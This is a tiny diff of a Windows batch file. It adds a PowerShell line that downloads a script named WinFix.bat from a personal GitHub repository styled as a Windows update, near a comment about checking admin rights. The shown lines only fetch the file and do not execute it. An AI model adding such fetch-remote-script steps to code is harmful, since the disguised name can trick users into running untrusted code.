@@ -1,6 +1,7 @@
 echo off
 set URL=https://raw.githubusercontent.com/acd167493/WinUpdate/refs/heads/main/WinFix.bat
 set OUTPUT=WinFix.bat
+powershell -Command "irm '%URL%' -OutFile '%OUTPUT%'"
 ::Check for admin rights 
 PAUSE
 :: goto :EOF
